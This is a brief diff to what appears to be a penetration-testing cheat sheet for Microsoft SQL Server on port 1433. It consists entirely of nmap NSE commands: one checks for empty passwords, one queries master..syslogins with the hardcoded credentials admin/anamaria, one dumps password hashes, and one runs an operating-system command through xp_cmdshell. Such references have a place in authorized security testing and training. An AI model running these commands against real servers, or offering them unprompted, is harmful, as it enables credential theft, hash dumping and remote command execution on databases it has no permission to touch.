@@ -6,4 +6,8 @@
 
 `nmap --script=ms-sql-empty-password -p 1433 <target>`
 
-`nmap --script=ms-sql-query --script-args=mssql.username=admin.mssql.password=anamaria.ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt -p 1433 <target>`
+`nmap --script=ms-sql-query --script-args=mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt -p 1433 <target>`
+
+`nmap --script=ms-sql-dump-hashes --script-args=mssql.username=admin,mssql.password=anamaria -p 1433 <target>`
+
+`nmap --script=ms-sql-xp-cmdshell --script-args=mssql.username=admin,mssql.password=anamaria,ms-xp-cmdshell.cmd="ipconfig" -p 1433 <target>`
